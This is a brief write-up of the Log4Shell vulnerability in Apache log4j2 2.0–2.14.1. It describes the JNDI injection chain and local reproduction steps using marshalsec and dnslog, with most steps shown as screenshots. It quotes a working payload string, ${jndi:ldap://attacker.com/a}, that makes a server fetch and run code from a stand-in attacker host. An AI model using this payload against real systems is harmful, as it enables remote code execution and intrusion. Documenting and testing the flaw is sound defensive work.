1、Vulnerability description

  * Users sent the data to the server (via any protocol)
  * The server logs the data in the request, containing the malicious payload: ${jndi:ldap://attacker.com/a} (where attacker.com is an attacker controlled server)
  * The log4j vulnerability is triggered by this payload and the server makes a request to attacker.com via “Java Naming and Directory Interface” (JNDI)
  * This response contains a path to a remote Java class file which is injected into the server process, this injected payload triggers a second stage, and allows an attacker to execute arbitrary code.

![1656744290_62bfe962e1f35d26ee9fb.png!small](https://image.3001.net/images/20220702/1656744290_62bfe962e1f35d26ee9fb.png!small)

2、Affected version

2.0 <= Apache log4j2 <= 2.14.1

the user needs to check whether the Java application introduces log4j API and
log4j core jars. If an application is used, it is likely to be affected.

3、Test process

1.Building a vulnerable environment locally

![1656744158_62bfe8ded77f46913b523.png!small](https://image.3001.net/images/20220702/1656744158_62bfe8ded77f46913b523.png!small)

2.Start marshalsec service locally

![1656744265_62bfe9490e83c72fd17cc.png!small](https://image.3001.net/images/20220702/1656744265_62bfe9490e83c72fd17cc.png!small)

3.Send a packet to the attacked server, check the RMI request, and find that
the JNDI log has been updated

![1656744248_62bfe938a802c8dd64b54.png!small](https://image.3001.net/images/20220702/1656744248_62bfe938a802c8dd64b54.png!small)

4\. Check dnslog.cn and find that it has been updated

![1656744134_62bfe8c60e8f1be8d7a08.png!small](https://image.3001.net/images/20220702/1656744134_62bfe8c60e8f1be8d7a08.png!small)

Request:

![1656744120_62bfe8b8a86244fa76a78.png!small](https://image.3001.net/images/20220702/1656744120_62bfe8b8a86244fa76a78.png!small)

